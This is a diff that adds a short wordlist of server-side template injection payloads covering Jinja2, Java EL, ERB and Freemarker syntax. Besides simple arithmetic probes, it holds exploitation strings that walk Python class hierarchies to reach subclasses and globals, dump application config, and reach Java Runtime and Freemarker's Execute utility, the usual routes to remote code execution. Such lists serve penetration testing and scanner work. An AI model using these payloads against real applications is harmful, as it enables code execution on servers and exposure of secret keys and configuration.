@@ -1,0 +1,18 @@
+# Server-Side Template Injection Payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+${7*'7'}
+{{config}}
+{{self.__class__.__mro__}}
+${T(java.lang.Runtime).getRuntime()}
+{{request.application.__globals__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{config.items()}}
+{{''.class.mro()[1].subclasses()}}
+{{lipsum.__globals__}}
+${class.getForName("java.lang.Runtime")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+{{''.__class__.__bases__[0].__subclasses__()}}
